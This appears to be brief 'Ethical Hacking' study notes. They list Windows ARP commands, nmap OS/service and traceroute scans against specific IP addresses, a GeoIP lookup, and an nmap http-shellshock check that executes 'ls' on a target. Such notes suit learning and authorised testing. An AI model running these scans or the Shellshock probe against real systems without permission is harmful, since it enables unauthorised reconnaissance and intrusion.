# Ethical Hacking

## Commands

### Windows

```bash
getmac  // get info of Ethernet card
arp -a // Mac to IP
arp -g // same as arp -a
arp -s 153.53.82.33 00-aa-00-62-c9-09 // adds static arp entry
arp --d ip // to delete static ip entry
```

## Footprinting Process

### Nmap and Traceroute

```bash
nmap -v -p 1-2000 -O -sV 178.128.203.1
nmap --traceroute --script traceroute-geolocation 178.128.203.1 -d
```

### GeoIp

```bash
geoiplookup 85.158.39.204
```

### Vulnerabilities

[Nmap](https://nmap.org/nsedoc/scripts/http-shellshock.html)

```bash
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/blabla.sh,cmd=ls 192.168.122.17
# sV = service versions
```